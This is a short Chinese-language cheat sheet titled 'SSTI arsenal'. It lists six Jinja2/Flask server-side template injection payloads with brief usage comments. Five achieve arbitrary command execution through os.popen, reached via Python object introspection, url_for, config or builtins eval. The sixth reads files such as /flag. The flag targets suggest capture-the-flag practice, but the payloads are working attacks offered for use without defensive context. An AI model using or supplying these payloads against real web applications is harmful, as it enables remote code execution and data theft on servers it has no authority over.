SSTI武器库

```
1、任意命令执行
{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('dir').read()%}{%endif%}{%endfor%}
2、任意命令执行
{{"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat /flag').read()}}
//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload
3、任意命令执行
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
4、任意命令执行
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}
//x的含义是可以为任意字母，不仅仅限于x
5、任意命令执行
{{config.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}
6、文件读取
{{x.__init__.__globals__['__builtins__'].open('/flag', 'r').read()}}
//x的含义是可以为任意字母，不仅仅限于x
```